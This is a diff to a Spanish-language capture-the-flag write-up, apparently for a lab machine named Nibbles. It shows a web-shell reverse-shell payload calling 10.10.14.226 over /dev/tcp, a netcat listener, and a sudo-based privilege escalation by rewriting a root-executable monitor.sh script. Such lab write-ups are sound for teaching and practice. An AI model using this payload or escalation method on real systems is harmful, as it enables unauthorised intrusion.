@@ -73,12 +73,25 @@ Ahora cargaremos una *Reverse Shell* y entablaremos una conexión con nuestra ma
 ?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.226/443 0>%261"
 ```
 
-Y poniendonos antes en escucha con
+Y poniéndonos antes en escucha con
 ```shell
 nc -nlvp 443
 ```
 
-Conseguimos entrablar una *Rverse Shell* con la maquina victima aghora haremos el tratamiento de la TTY y continuaremos con la explotacionm
+Conseguimos entablar una *Rverse Shell* con la maquina victima ahora haremos el tratamiento de la TTY y continuaremos con la explotación
 En el directorio del usuario encontraremos la flag del user
 
-Ahora realizaremos la escalada de privilegios 
+Ahora realizaremos la escalada de privilegios viendo que comandos podemos ejecutar como *root*
+```shell
+sudo -l
+```
+
+Encontrando una archivo `.sh`
+![[Pasted image 20260909214313.png]]
+
+Este archivo esta en el directorio del user, primero tendremos que descomprimir la carpeta `personal.zip` y hacer una enumeración del archivo para saber como funciona este
+```shell
+cat /home/nibbler/personal/stuff/monitor.sh
+```
+
+Este script es un script de monitorizacion del sistema, la parte interesante es que el script con ese nombre se puede ejecutar como root asi que si en vez de llamr directamente a la ruta modificamos este script y cargamos una ejecucion de una shell como root, elevaremos nuestro privilegio
